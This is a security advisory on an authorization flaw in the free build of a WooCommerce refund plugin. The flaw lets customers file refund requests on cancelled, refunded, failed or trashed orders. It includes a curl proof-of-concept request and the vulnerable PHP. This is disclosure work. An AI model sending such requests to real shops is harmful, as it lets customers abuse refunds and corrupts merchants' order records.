# FR-03 — Refund requests accepted on cancelled/refunded/failed/trashed orders (free build)

- **Plugin:** Flexible Refund and Return Order for WooCommerce (free)
- **Vendor:** WP Desk · **slug:** `flexible-refund-and-return-order-for-woocommerce`
- **Affected:** all releases ≤ 2.0.3 (verified 1.0.38, 1.0.51, 2.0.3 — not a 2.0 regression)
- **Tested:** 2.0.3 · WordPress 7.1.2 · WooCommerce 11.1.2
- **Class:** Incorrect Authorization / business logic — CWE-863
- **Privileges:** authenticated Customer (own order)
- **CVSS 3.1:** 4.3 `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N`
- **Evidence:** [`evidence/trace.txt`](evidence/trace.txt) · **PoC:** [`poc/poc.sh`](poc/poc.sh)

## What the bug is, in one paragraph

The plugin is supposed to refuse refund requests on orders that are cancelled, already refunded,
or failed — it even ships that exact exclusion list in its code. But the check only runs in the
PRO build. In the free build no order status is ever checked, so a customer can open a refund
request on an order that is cancelled, fully refunded, failed, or even in the **trash** — and a
trashed order is pulled back out of the trash in the process.

## Root cause

`vendor_prefixed/wpdesk/flexible-refunds-core/src/Service/FormAvailability.php`, `can_start()`:

```php
if ($this->is_pro) {                                         // <-- status gate is PRO-only
    if (!(new RefundCondition($conditions,$order))->should_show($allow_cancelled)) return false;
    ...
}
return true;                                                  // free build: any status passes
```

The intended rule lives in `Conditions/RefundCondition.php`, never reached in free:

```php
const EXCLUDED_CONDITIONS = ['wc-cancelled', 'wc-refunded', 'wc-failed'];
```

`can_start()` is the only eligibility gate for both rendering the form and saving the POST
(`MyAccount::save_refund_request()`), so the status is checked in neither.

## Proof of concept

```bash
# order owner (customer), on an order whose status is wc-cancelled:
curl -s -b attacker.cookies -o /dev/null -w 'HTTP %{http_code} -> %{redirect_url}\n' \
  'http://TARGET/my-account/fr-refund/<CANCELLED_ORDER>/?form_id=1' \
  --data-urlencode 'fr_refund_form[items][<ITEM>][qty]=1' \
  --data-urlencode 'fr_refund_form[form_id]=1' \
  --data-urlencode 'fr_refund_form[fr_refund_request]=<NONCE>'
```

**Result:** `302 ...&request=send`; a `wp_fr_requests` row is created (`status=requested`) and the
cancelled order flips to `wc-refund-request`. Reproduced identically on `refunded`, `failed` and
`trash` orders. Full trace: [`evidence/trace.txt`](evidence/trace.txt).

## Impact

A customer can open refund requests on orders the shop already closed/refunded/failed/trashed,
corrupting order state (including un-trashing removed orders). A later manager approval on a
cancelled-but-paid order then issues a real refund — exactly what the exclusion list was meant to
prevent.

## Remediation

Evaluate `RefundCondition` (or an equivalent order-status gate) inside `can_start()` for the free
build too, not only under `if ($this->is_pro)`.
